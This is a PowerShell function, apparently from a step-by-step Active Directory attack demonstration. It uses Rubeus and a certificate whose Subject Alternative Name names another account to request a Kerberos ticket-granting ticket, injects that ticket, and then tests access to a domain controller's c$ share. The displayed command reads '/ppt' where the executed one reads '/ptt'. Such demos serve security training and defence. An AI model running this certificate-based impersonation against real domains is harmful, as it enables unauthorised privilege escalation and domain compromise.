function Request-TGTWithRubeus {

    ################################################################################
    #####                                                                      ##### 
    #####  Request a ticket-granting ticket (TGT) by using the pfx certificate #####
    #####                                                                      #####
    ################################################################################

    Param(
        [string] $pfxFile, 
        [PSCustomObject]$AlternativeAccount
    )

    $CurrentFunction = Get-FunctionName
    Write-Log -Message "### Start Function $CurrentFunction ###"
    $StartRunTime = (Get-Date).ToString($Script:DateFormatLog)
    #################### main code | out- host ##################
    
    If (-not $SkipClearHost) { Clear-Host }

    Write-Host "____________________________________________________________________`n" 
    Write-Host "            FIRST try to connect to a DC c$ share            "
    Write-Host "____________________________________________________________________`n" 
    
    $directory = "\\$Script:ASDC\c$"
    Get-DirContent -Path $directory
    If (-not $UnAttended) { pause }
    If (-not $SkipClearHost) { Clear-Host }
    
    Invoke-Output -Type Header -Message "Step 4 - Request a Ticket Granting Ticket (TGT) with Rubeus"
    Invoke-Output -Type  H1 -Message "Request a ticket-granting ticket for the account that was added`nas Subject Alternative Name (SAN) to the issued certificate."
    
    $domain = $AlternativeAccount.FQDN
    $user = $AlternativeAccount.samaccountname

    Invoke-Output -Type CodeSnippet -Message "Command:"
    Write-Highlight -Text "     .\Rubeus.exe ", "asktgt /user:", "$user", " /domain:", "$domain", " /certificate:", "MIACAQMwgAYJKoZ [..] AAAAA=", " /ppt /enctype:aes256"  `
        -Color $fgcC, $fgcS, $fgcV , $fgcS, $fgcV, $fgcS, $fgcV, $fgcS
    Write-Host ""

    If (-not $UnAttended) { pause }
    Invoke-Output -Type Codesnippet -Message "Requesting TGT with Rubeus ..."
    Invoke-Command -ScriptBlock { & "$($Script:ASTools)\Rubeus.exe" asktgt /user:$user /domain:$domain /certificate:$pfxFile /ptt /enctype:aes256 } | Out-Host

    If (-not $UnAttended) { pause }
    $tickets = Get-KlistTicket
    $tickets | Format-Table TicketNumber, Client, Server, EncryptionType, EndTime -AutoSize
    Invoke-Output -Type Info -Message "Last Ticket"
    $tickets | Select-object -Last 1 | Format-List
    If (-not $UnAttended) { pause }

    Write-Host "____________________________________________________________________`n" 
    Write-Host "            Now try again to connect to a DC c$ share            "
    Write-Host "____________________________________________________________________`n" 
    
    $directory = "\\$Script:ASDC\c$"
    Get-DirContent -Path $directory
    If (-not $UnAttended) { pause }
    If (-not $SkipClearHost) { Clear-Host }

    $tickets = Get-KlistTicket
    $tickets | Format-Table TicketNumber, Client, Server, EncryptionType, EndTime -AutoSize
    Invoke-Output -Type Info -Message "Last Ticket"
    $tickets | Select-object -Last 1 | Format-List
    If (-not $UnAttended) { pause }

    Write-Log -Message "    >> using $PfxFile"
    ######################## main code ############################
    $runtime = Get-RunTime -StartRunTime $StartRunTime
    Write-Log -Message "    Run Time: $runtime [h] ###"
    Write-Log -Message "### End Function $CurrentFunction ###"
}
